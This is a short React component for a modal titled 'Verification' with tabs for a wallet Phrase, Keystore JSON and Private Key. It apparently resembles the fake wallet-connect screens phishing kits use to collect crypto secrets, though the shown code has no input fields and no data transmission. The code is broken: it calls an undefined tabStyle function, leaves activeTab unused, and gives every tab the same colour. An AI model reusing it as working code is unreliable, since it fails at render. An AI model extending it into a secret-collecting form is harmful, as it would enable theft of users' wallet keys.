import { Close } from '@mui/icons-material';
import { Modal } from '@mui/material';
import React, { useState } from 'react';

const ConnectModal = ({ open, setOpen }) => {
	const [activeTab, setActiveTab] = useState('phrase');
	const handleClose = () => {
		setOpen(false);
	};
	const tabFunc = (tab) => {
		return {
			backgroundColor:
				tab === 'phrase'
					? '#5878BC'
					: tab === 'keystore'
					? '#5878BC'
					: tab === 'private'
					? '#5878BC'
					: 'transparent',
		};
	};
	return (
		<Modal open={open}>
			<div className='container connect'>
				<div className='modal-top'>
					<h2>Verification</h2>
					<Close onClick={handleClose} className='closeIcon' />
				</div>
				<div className='modal-body'>
					<div className='tabs'>
						<div style={tabStyle('phrase')} className='tab tab1'>
							Phrase
						</div>
						<div style={tabStyle('keystore')} className='tab tab2'>
							Keystore JSON
						</div>
						<div style={tabStyle('private')} className='tab tab3'>
							Private Key
						</div>
					</div>
				</div>
			</div>
		</Modal>
	);
};

export default ConnectModal;
